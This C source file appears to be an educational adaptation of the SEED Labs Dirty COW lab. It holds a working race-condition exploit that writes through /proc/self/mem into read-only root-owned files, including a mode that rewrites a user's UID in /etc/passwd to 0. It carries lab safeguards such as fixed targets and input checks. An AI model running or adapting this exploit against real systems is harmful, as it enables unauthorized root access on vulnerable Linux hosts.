/* Educational adaptation of SEED Labs' Dirty COW pattern, Wenliang Du.
 * CC BY-NC-SA 4.0; see ../README.md. Requires a vulnerable Linux kernel.
 * Fixed task modes only: /zzz replacement or charlie's known UID field.
 * Run via run_trial.sh, which bounds runtime and records file observations.
 */
#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

static void *mapping;
static size_t mapping_size;
static off_t memory_address;
static const char *replacement;
static size_t replacement_size;

static void fail(const char *operation)
{
    perror(operation);
    exit(EXIT_FAILURE);
}

static void *discard_thread(void *unused)
{
    (void)unused;
    for (;;) {
        if (madvise(mapping, mapping_size, MADV_DONTNEED) != 0)
            fail("madvise");
    }
    return NULL;
}

static void *write_thread(void *unused)
{
    (void)unused;
    int fd = open("/proc/self/mem", O_RDWR);
    if (fd == -1)
        fail("open /proc/self/mem");
    for (;;) {
        /* This offset is a VIRTUAL ADDRESS, not an offset into /etc/passwd.
         * pwrite combines the upstream lseek + write on this private fd. */
        ssize_t count = pwrite(fd, replacement, replacement_size, memory_address);
        if (count == -1 && errno == EINTR)
            continue;
        if (count == -1)
            fail("pwrite /proc/self/mem");
        if ((size_t)count != replacement_size) {
            fprintf(stderr, "Short memory write; inspect the target before retrying.\n");
            exit(EXIT_FAILURE);
        }
    }
    return NULL;
}

int main(int argc, char **argv)
{
    const char *path;
    const char *pattern;
    char prefix[64];
    char zeroes[16];
    size_t field_offset = 0;
    struct stat st;
    pthread_t discard, writer;

    if (getuid() == 0 || geteuid() == 0) {
        fprintf(stderr, "Run as ordinary seed, without sudo or Set-UID.\n");
        return 1;
    }
    if (argc == 2 && strcmp(argv[1], "dummy") == 0) {
        path = "/zzz";
        pattern = "222222";
        replacement = "******";
    } else if (argc == 3 && strcmp(argv[1], "passwd") == 0) {
        size_t n = strlen(argv[2]);
        if (n == 0 || n > 10 || strspn(argv[2], "0123456789") != n ||
            strspn(argv[2], "0") == n) {
            fprintf(stderr, "Supply charlie's current nonzero numeric UID.\n");
            return 1;
        }
        snprintf(prefix, sizeof(prefix), "charlie:x:%s:", argv[2]);
        memset(zeroes, '0', n);
        zeroes[n] = '\0';
        path = "/etc/passwd";
        pattern = prefix;
        field_offset = strlen("charlie:x:");
        replacement = zeroes;
    } else {
        fprintf(stderr, "Usage: %s dummy | passwd <charlie-current-UID>\n", argv[0]);
        return 1;
    }

    int fd = open(path, O_RDONLY);
    if (fd == -1)
        fail("open target O_RDONLY");
    if (fstat(fd, &st) == -1)
        fail("fstat");
    if (!S_ISREG(st.st_mode) || st.st_uid != 0 || st.st_size <= 0 ||
        st.st_size > 1024 * 1024 || access(path, W_OK) == 0) {
        fprintf(stderr, "Target must be small, root-owned, regular and not writable by caller.\n");
        return 1;
    }
    mapping_size = (size_t)st.st_size;
    mapping = mmap(NULL, mapping_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (mapping == MAP_FAILED)
        fail("mmap");
    close(fd);

    /* Bounded search: unlike strstr, this does not require a NUL-terminated file. */
    size_t pattern_size = strlen(pattern);
    char *position = memmem(mapping, mapping_size, pattern, pattern_size);
    if (position == NULL) {
        fprintf(stderr, "Pattern absent. Reset baseline or check charlie's actual UID.\n");
        return 1;
    }
    size_t start = (size_t)(position - (char *)mapping);
    size_t after = start + pattern_size;
    if (memmem((char *)mapping + after, mapping_size - after, pattern, pattern_size) != NULL ||
        (field_offset != 0 && start != 0 && position[-1] != '\n')) {
        fprintf(stderr, "Pattern is ambiguous or not at the start of charlie's record.\n");
        return 1;
    }
    replacement_size = strlen(replacement);
    memory_address = (off_t)(uintptr_t)(position + field_offset);
    printf("RUID=%lu EUID=%lu target=%s file-byte-offset=%lu length=%lu\n",
           (unsigned long)getuid(), (unsigned long)geteuid(), path,
           (unsigned long)(start + field_offset), (unsigned long)replacement_size);
    puts("O_RDONLY + PROT_READ + MAP_PRIVATE; racing memory writes and MADV_DONTNEED.");
    puts("Run bounded trials with run_trial.sh; Ctrl+C stops a direct run.");
    fflush(stdout);

    int error = pthread_create(&discard, NULL, discard_thread, NULL);
    if (error != 0) {
        errno = error;
        fail("pthread_create discard");
    }
    error = pthread_create(&writer, NULL, write_thread, NULL);
    if (error != 0) {
        errno = error;
        fail("pthread_create writer");
    }
    pthread_join(discard, NULL);
    pthread_join(writer, NULL);
    return 0;
}
